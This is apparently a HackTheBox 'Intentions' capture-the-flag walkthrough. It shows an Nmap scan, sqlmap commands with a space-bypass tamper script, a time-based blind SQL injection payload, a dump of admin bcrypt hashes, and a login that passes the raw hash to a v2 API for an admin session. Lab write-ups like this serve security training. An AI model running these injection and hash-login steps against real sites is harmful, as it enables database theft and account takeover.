---
title:  "HTB Intentions Writeup"
date:   2023-10-14 14:26:19 +0200
categories: HTB writeup
tags: SQLI HTB
---



![Inetions box card](/assets/1688114839753.jpg)

# Introduction


# Recon

To start our recon off we will start with an Nmap scan of all the TCP ports. using the following command
```
sudo nmap -sS -A -p- 10.10.11.220 -v -oN nmap
```


**Nmap**
```
# Nmap 7.94 scan initiated Tue Jul  4 12:56:08 2023 as: nmap -sS -A -p- -v -oN nmap 10.10.11.220
Nmap scan report for 10.10.11.220
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/4%OT=22%CT=1%CU=32765%PV=Y%DS=2%DC=T%G=Y%TM=64A44F5A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 6.658 days (since Tue Jun 27 21:09:20 2023)
Network Distance: 2 hops

TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   24.34 ms 10.10.14.1
2   24.53 ms 10.10.11.220

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  4 12:56:58 2023 -- 1 IP address (1 host up) scanned in 50.38 seconds
```

Seeing that Nmap only showed two ports open one being HTTP and the other SSH I decided to check out the website first to look for any web vulnerabilities.

# Foothold
## Web application 

When browsing to the web application you needed to create an account to log into it. After registering into the application i noticed that the amount of functionality was rather limited. The thing that looked odd was whenever changing the Favorite Genre's tab in the profile the pictures in your feed would change.
![Profile Genre's changed](/assets/Intentions_1.png)

After changing the value we could see below that our image feed was empty. This makes me believe that there is a posibility for Second hand SQL injection here.

![Data feed empty](/assets/Intentions_2.png)

I'm going to use SQLmap to speed up the process of the SQL injection. The easiest way to do this is by taking the web requests for both the injection request and the second hand request.

First we capture the request we want to inject into by changing the Favourite genre's again. This resulted into the following request


```
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IlVqeWNUSXJ6Q1I3L2MrVmxqdzhpWEE9PSIsInZhbHVlIjoiSndjSEJLekl1dGNjNm90d2VneEVOKzh4UmpNWTRhRmp3a3JTL2R0S2E2dE5BZnNrdFo2WFhDQ2dhOFRUQmlLZmVMK3VHQ3ZpdkhsQ29QZGhGQnptQU1hbnhQanNSR0ZPb1E1aGtLOEZtN04wNEFXZkFnV0dIbm5uek1mRzJFWnkiLCJtYWMiOiI2ZmNkODE1ZjAzZDU3MjhjYThmYjdhNmQ2NDgyYTMwY2UyNGZhM2Q2YzE2MmE4MDc4ZTVkOTEwMGQyMDE5NDkxIiwidGFnIjoiIn0=
Content-Length: 17
Origin: http://10.10.11.220
Connection: close
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlVqeWNUSXJ6Q1I3L2MrVmxqdzhpWEE9PSIsInZhbHVlIjoiSndjSEJLekl1dGNjNm90d2VneEVOKzh4UmpNWTRhRmp3a3JTL2R0S2E2dE5BZnNrdFo2WFhDQ2dhOFRUQmlLZmVMK3VHQ3ZpdkhsQ29QZGhGQnptQU1hbnhQanNSR0ZPb1E1aGtLOEZtN04wNEFXZkFnV0dIbm5uek1mRzJFWnkiLCJtYWMiOiI2ZmNkODE1ZjAzZDU3MjhjYThmYjdhNmQ2NDgyYTMwY2UyNGZhM2Q2YzE2MmE4MDc4ZTVkOTEwMGQyMDE5NDkxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlR0ZFZGZXBnSWp0NG90UHQrbTlSWVE9PSIsInZhbHVlIjoiT1htNVZZUmM2bW5zNmlGYjlydklyZlIxWlBsaXhZWk9HakJ2WDR1WWVpdzVaMTdNbUJ3ZTRnZXFkSllrQ3E0eVN1QUsrOFQvMnl0MzdMdUhCa1Q3aXNIOEpPcjRTSDJPTGg5YkllcElhVy9GNjN0ZXJ0N1B5NlpITmVCdjFISDIiLCJtYWMiOiJlZTk5YTViZDVkNzQyYzAzOWZiNmExZjczMjQ4M2Q1OWVkMWY5YmNjNTE5MTdjMGJlOTYyYzY1NzllOTdjMDdmIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k

{"genres":"TEST"}
```

Next up we captured the request for viewing the data feed by browsing to Your Feed.
```
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IlVqeWNUSXJ6Q1I3L2MrVmxqdzhpWEE9PSIsInZhbHVlIjoiSndjSEJLekl1dGNjNm90d2VneEVOKzh4UmpNWTRhRmp3a3JTL2R0S2E2dE5BZnNrdFo2WFhDQ2dhOFRUQmlLZmVMK3VHQ3ZpdkhsQ29QZGhGQnptQU1hbnhQanNSR0ZPb1E1aGtLOEZtN04wNEFXZkFnV0dIbm5uek1mRzJFWnkiLCJtYWMiOiI2ZmNkODE1ZjAzZDU3MjhjYThmYjdhNmQ2NDgyYTMwY2UyNGZhM2Q2YzE2MmE4MDc4ZTVkOTEwMGQyMDE5NDkxIiwidGFnIjoiIn0=
Connection: close
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlVqeWNUSXJ6Q1I3L2MrVmxqdzhpWEE9PSIsInZhbHVlIjoiSndjSEJLekl1dGNjNm90d2VneEVOKzh4UmpNWTRhRmp3a3JTL2R0S2E2dE5BZnNrdFo2WFhDQ2dhOFRUQmlLZmVMK3VHQ3ZpdkhsQ29QZGhGQnptQU1hbnhQanNSR0ZPb1E1aGtLOEZtN04wNEFXZkFnV0dIbm5uek1mRzJFWnkiLCJtYWMiOiI2ZmNkODE1ZjAzZDU3MjhjYThmYjdhNmQ2NDgyYTMwY2UyNGZhM2Q2YzE2MmE4MDc4ZTVkOTEwMGQyMDE5NDkxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlR0ZFZGZXBnSWp0NG90UHQrbTlSWVE9PSIsInZhbHVlIjoiT1htNVZZUmM2bW5zNmlGYjlydklyZlIxWlBsaXhZWk9HakJ2WDR1WWVpdzVaMTdNbUJ3ZTRnZXFkSllrQ3E0eVN1QUsrOFQvMnl0MzdMdUhCa1Q3aXNIOEpPcjRTSDJPTGg5YkllcElhVy9GNjN0ZXJ0N1B5NlpITmVCdjFISDIiLCJtYWMiOiJlZTk5YTViZDVkNzQyYzAzOWZiNmExZjczMjQ4M2Q1OWVkMWY5YmNjNTE5MTdjMGJlOTYyYzY1NzllOTdjMDdmIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k

```

Save both of these request to a file and then you can try to use SQLmap to exploit the SQL injection. I always include my burp proxy while using SQLmap this can help debug issues.
```
sqlmap -r SQL/sqli.txt --second-req SQL/Second_sqli.txt -p genres  --proxy http://127.0.0.1:8080
```

Using these Parameters i was not able to get successfull SQLI but looking at the results i could see that SQL injection was still a possibility because the page would show errors with some statements. Next i looked closer into what happens to the request when trying change the favourite genre's. here i discovered that all the input was being modified, All spaces were being removed.

To test this i changed my favourite genre's to a sentence with spaces in it. In the request below we can see there are spaces in the genre's parameter.
```
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IlVqeWNUSXJ6Q1I3L2MrVmxqdzhpWEE9PSIsInZhbHVlIjoiSndjSEJLekl1dGNjNm90d2VneEVOKzh4UmpNWTRhRmp3a3JTL2R0S2E2dE5BZnNrdFo2WFhDQ2dhOFRUQmlLZmVMK3VHQ3ZpdkhsQ29QZGhGQnptQU1hbnhQanNSR0ZPb1E1aGtLOEZtN04wNEFXZkFnV0dIbm5uek1mRzJFWnkiLCJtYWMiOiI2ZmNkODE1ZjAzZDU3MjhjYThmYjdhNmQ2NDgyYTMwY2UyNGZhM2Q2YzE2MmE4MDc4ZTVkOTEwMGQyMDE5NDkxIiwidGFnIjoiIn0=
Content-Length: 27
Origin: http://10.10.11.220
Connection: close
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlVqeWNUSXJ6Q1I3L2MrVmxqdzhpWEE9PSIsInZhbHVlIjoiSndjSEJLekl1dGNjNm90d2VneEVOKzh4UmpNWTRhRmp3a3JTL2R0S2E2dE5BZnNrdFo2WFhDQ2dhOFRUQmlLZmVMK3VHQ3ZpdkhsQ29QZGhGQnptQU1hbnhQanNSR0ZPb1E1aGtLOEZtN04wNEFXZkFnV0dIbm5uek1mRzJFWnkiLCJtYWMiOiI2ZmNkODE1ZjAzZDU3MjhjYThmYjdhNmQ2NDgyYTMwY2UyNGZhM2Q2YzE2MmE4MDc4ZTVkOTEwMGQyMDE5NDkxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlR0ZFZGZXBnSWp0NG90UHQrbTlSWVE9PSIsInZhbHVlIjoiT1htNVZZUmM2bW5zNmlGYjlydklyZlIxWlBsaXhZWk9HakJ2WDR1WWVpdzVaMTdNbUJ3ZTRnZXFkSllrQ3E0eVN1QUsrOFQvMnl0MzdMdUhCa1Q3aXNIOEpPcjRTSDJPTGg5YkllcElhVy9GNjN0ZXJ0N1B5NlpITmVCdjFISDIiLCJtYWMiOiJlZTk5YTViZDVkNzQyYzAzOWZiNmExZjczMjQ4M2Q1OWVkMWY5YmNjNTE5MTdjMGJlOTYyYzY1NzllOTdjMDdmIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k

{"genres":"This is a test"

```

But when we refresh the Your profile page you can see that all the spaces have been removed.

**Request**
```
GET /api/v1/auth/user HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6InUzYUFNMGVwcTQxUlF0QlV6Z1lTRGc9PSIsInZhbHVlIjoiWXF6VFdTRUxKNjg0SE5Vc0syMXNZNlBGMmMrdmZ2ZzZPNmV1WEdHMko5WTErY2NPeXBUM3M3WUpSRzhKQVNaSDNIRmZreC9KQXFwczgvYzFLT1lXUldWcVV0U0piMTdkaVZHVXZDTmpTbE9hcytPa3NpYnRwRkNSVVFISFlMaDMiLCJtYWMiOiJhMWU5OGFhOTYxYzgwOTBlYzFiZmQzNmE3OWYyYTVlNzA4YzYyYmNlMzc4MDYxNTIyMTM4NGQ4YTJkODY0N2FhIiwidGFnIjoiIn0=
Connection: close
Referer: http://10.10.11.220/gallery
Cookie: XSRF-TOKEN=eyJpdiI6InUzYUFNMGVwcTQxUlF0QlV6Z1lTRGc9PSIsInZhbHVlIjoiWXF6VFdTRUxKNjg0SE5Vc0syMXNZNlBGMmMrdmZ2ZzZPNmV1WEdHMko5WTErY2NPeXBUM3M3WUpSRzhKQVNaSDNIRmZreC9KQXFwczgvYzFLT1lXUldWcVV0U0piMTdkaVZHVXZDTmpTbE9hcytPa3NpYnRwRkNSVVFISFlMaDMiLCJtYWMiOiJhMWU5OGFhOTYxYzgwOTBlYzFiZmQzNmE3OWYyYTVlNzA4YzYyYmNlMzc4MDYxNTIyMTM4NGQ4YTJkODY0N2FhIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ik4xbnZ0UjRrMVlOQjA3MFNRR2ovTXc9PSIsInZhbHVlIjoiWTJKbW9WUWdjczRFR3B1VkRDWFE4NkFSdklsZFh3UFhBNGxnTFltTER2YkhwaHN6TmVHWndPSVJna2FKM09RK3ZRSG1rb1NYaTQvYVJ1Yzd4dnN4d3RVVGVlNzVaeDFKNVpsUmtkRkZBR3BpSjdySklzYUxSYnJLc0YzQksxU3UiLCJtYWMiOiJkMzVlMjZjNDE4YmNjOGZlNGYxMmZmNzY0OGQ4ZjE3YzZlYjAzMDFjMjRhNjAxNTRmZmU0OGMxMGMxMmNhZGUxIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k

```
**Response**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Sat, 14 Oct 2023 13:36:41 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3599
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 199

{"status":"success","data":{"id":31,"name":"test","email":"Calico1@nomail.com","created_at":"2023-10-14T11:57:28.000000Z","updated_at":"2023-10-14T13:34:30.000000Z","admin":0,"genres":"Thisisatest"}}

```

Knowing this we can add the space2comment sqlmap tamper script. This script basically replaces all spaces to comments to achieve the same effect as a space without using these characters

After a few moments we got the following message showing that this function was indeed vulnrable to Second hand SQLI injection 
```
[09:42:25] [INFO] checking if the injection point on (custom) POST parameter 'JSON genres' is a false positive
(custom) POST parameter 'JSON genres' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: JSON genres ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"TEST') AND (SELECT 2318 FROM (SELECT(SLEEP(5)))Ufyb) AND ('SOBr'='SOBr"}
---
```

Using the following command you can dump the entire database. This will get you all the data you need but wil also take a very long time. 

```
sqlmap -r sqli.txt --second-req Second_sqli.txt -p genres  --proxy http://127.0.0.1:8080 --tamper=space2comment --all
```

```
0.6.12-MariaDB-0ubuntu0.22.04.1
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
banner: '10.6.12-MariaDB-0ubuntu0.22.04.1'
current user: 'laravel@localhost'
current database: 'intentions'
fetching tables for databases: 'information_schema, intentions'
```



The above script will get you the hashes you want however if you want to speed it up you can just dump the specific table you need using the following command. By running the previous command i was able to figure out that the Database name was Intentions and there was a table Users. I then tried to dump this table.

```
sqlmap -r sqli.txt --second-req Second_sqli.txt -p genres  --proxy http://127.0.0.1:8080 --tamper=space2comment --no-escape  -D intentions -T users -C id,name,email,password,admin --dump

```
After running this for a little while we ended up with the following output including the hashes of both Steve and Greg. There were more users but these users were not administrative users so i didn't deem them interesting.

```
+----+-------+----------------------+--------------------------------------------------------------+-------+
| id | name  | email                | password                                                     | admin |
+----+-------+----------------------+--------------------------------------------------------------+-------+
| 1  | steve | steve@intentions.htb | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 1     |
| 2  |      | greg@intentions.htb  | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 1     |
+----+-------+----------------------+--------------------------------------------------------------+-------+

```
I tried to crack these hashes however this was unsuccessful. This means i must have missed something and continued my enumeration of the box.

I decided to run dirsearch to try and find any files or web pages which might not be linked. It is importent to use the cookies from one of the previous requests otherwise you'll be scanning unauthenticated and get less results.
```
dirsearch  -r -u http://10.10.11.220/js --proxy=http://127.0.0.1:8080 --cookie="XSRF-TOKEN=eyJpdiI6InUzYUFNMGVwcTQxUlF0QlV6Z1lTRGc9PSIsInZhbHVlIjoiWXF6VFdTRUxKNjg0SE5Vc0syMXNZNlBGMmMrdmZ2ZzZPNmV1WEdHMko5WTErY2NPeXBUM3M3WUpSRzhKQVNaSDNIRmZreC9KQXFwczgvYzFLT1lXUldWcVV0U0piMTdkaVZHVXZDTmpTbE9hcytPa3NpYnRwRkNSVVFISFlMaDMiLCJtYWMiOiJhMWU5OGFhOTYxYzgwOTBlYzFiZmQzNmE3OWYyYTVlNzA4YzYyYmNlMzc4MDYxNTIyMTM4NGQ4YTJkODY0N2FhIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ik4xbnZ0UjRrMVlOQjA3MFNRR2ovTXc9PSIsInZhbHVlIjoiWTJKbW9WUWdjczRFR3B1VkRDWFE4NkFSdklsZFh3UFhBNGxnTFltTER2YkhwaHN6TmVHWndPSVJna2FKM09RK3ZRSG1rb1NYaTQvYVJ1Yzd4dnN4d3RVVGVlNzVaeDFKNVpsUmtkRkZBR3BpSjdySklzYUxSYnJLc0YzQksxU3UiLCJtYWMiOiJkMzVlMjZjNDE4YmNjOGZlNGYxMmZmNzY0OGQ4ZjE3YzZlYjAzMDFjMjRhNjAxNTRmZmU0OGMxMGMxMmNhZGUxIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k"
```

This resulted in me finding the admin.js page which was linked nowhere in the main website. upon further inspection there was some interesting information in this page mentioning that there is a new API where users can log in using just their hash.

```
      staticClass: "pt-4 col-md-8 offset-md-2"
            }, [e("div", {
                staticClass: "p-2 text-center bg-light"
            }, [e("h4", {
                staticClass: "mb-3"
            }, [t._v("News")])]), t._v(" "), e("div", {
                staticClass: "card mb-4"
            }, [e("div", {
                staticClass: "card-body"
            }, [e("h5", {
                staticClass: "card-title"
            }, [t._v("Legal Notice")]), t._v(" "), e("p", {
                staticClass: "card-text"
            }, [t._v("\n                Recently we've had some copyrighted images slip through onto the gallery. \n                This could turn into a big issue for us so we are putting a new process in place that all new images must go through our legal council for approval.\n                Any new images you would like to add to the gallery should be provided to legal with all relevant copyright information.\n                I've assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps.\n                This will be the only way to add images to our gallery going forward.\n            ")])])]), t._v(" "), e("div", {
                staticClass: "card"
            }, [e("div", {
                staticClass: "card-body"
            }, [e("h5", {
                staticClass: "card-title"
            }, [t._v("v2 API Update")]), t._v(" "), e("p", {
                staticClass: "card-text"
            }, [t._v("\n                Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n            ")]), t._v(" "), e("p", {
                staticClass: "card-text"
            }, [t._v("\n                The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: "), e("a", {
                attrs: {
                    rel: "noopener noreferrer nofollow",
                    href: "https://www.php.net/manual/en/class.imagick.php"
                }
            }, [t._v("Image Feature Reference")])])])])])
```

Using this information i tried to log into the application using greg his username and hash.

**Request**
```
POST /api/v2/auth/login HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6Ik1OUXFUc29VZjZwN3VxY0dtT045cmc9PSIsInZhbHVlIjoiU1dIN1lzQ0N4bURXdjMzMFdWQlNIRlN1b0lNRlRHdWlCVGpJWFlkZnhTdXA3SktyclFZTCtsUnN0NGdDVkc1bTY3VE80YnJpUkN2SDg4TFRWcUszWXpFaE4vaE5CRjBQNzdMK2FUVmkzb1AzQ2UxVjZaci9jRHJRaHdObVNsRUwiLCJtYWMiOiJkNmIyMjNiMzQ1YjczMDhmODllODNiNWUxMDJiYmU0ZTBmZGNiOWFkM2NiYjkxZDQ1NmJhZGI3N2QyYzk0NzZmIiwidGFnIjoiIn0=
Content-Length: 101
Origin: http://10.10.11.220
Connection: close
Referer: http://10.10.11.220/
Cookie: XSRF-TOKEN=eyJpdiI6Ik1OUXFUc29VZjZwN3VxY0dtT045cmc9PSIsInZhbHVlIjoiU1dIN1lzQ0N4bURXdjMzMFdWQlNIRlN1b0lNRlRHdWlCVGpJWFlkZnhTdXA3SktyclFZTCtsUnN0NGdDVkc1bTY3VE80YnJpUkN2SDg4TFRWcUszWXpFaE4vaE5CRjBQNzdMK2FUVmkzb1AzQ2UxVjZaci9jRHJRaHdObVNsRUwiLCJtYWMiOiJkNmIyMjNiMzQ1YjczMDhmODllODNiNWUxMDJiYmU0ZTBmZGNiOWFkM2NiYjkxZDQ1NmJhZGI3N2QyYzk0NzZmIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlNzbUtTZitVS0R2ZGJPdUpZL2IreFE9PSIsInZhbHVlIjoiU1hwMlQvT3kwWUhGTzhFZW9NUXdNOU1nS0lTeFpZUDhBZnJsMWFCZzh1R2QyU0VUWUhUYkZ6SjZnU29lOTA4Q250ZXpwUi82dVh0c0Z2Y0RYeTRCdE5OVTBhMnNJamN6eTljQ2lGTy9iZEp4UUdPdTcyY016Rmkvc3piemFXN2QiLCJtYWMiOiIxOTlhNjE2MDgxYzI5NzlkZWU2OGQ4ZjQ3OGM3MGJjZDIzODczZGI2MWMzOWRlYWM1OGQ1MGI3MjYwYTYwYTMyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k

{"email":"greg@intentions.htb","hash":"$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m"
```

This server then issued the following response giving us a valid session token

**Response**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Sat, 14 Oct 2023 14:17:03 GMT
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3MjkzMDIzLCJleHAiOjE2OTczMTQ2MjMsIm5iZiI6MTY5NzI5MzAyMywianRpIjoiMzhnTmMxRGtIZ0lQREJGcSIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HBdW-t5hCQ8e71PJp04u0FfkDBZoduAtVY7Pp9BmWsE
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3598
Access-Control-Allow-Origin: *
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3MjkzMDIzLCJleHAiOjE2OTczMTQ2MjMsIm5iZiI6MTY5NzI5MzAyMywianRpIjoiMzhnTmMxRGtIZ0lQREJGcSIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HBdW-t5hCQ8e71PJp04u0FfkDBZoduAtVY7Pp9BmWsE; expires=Sat, 14-Oct-2023 20:17:03 GMT; Max-Age=21600; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 34

{"status":"success","name":"greg"}
```

By adding this cookie to your browser session you could log into the admin pages.
```
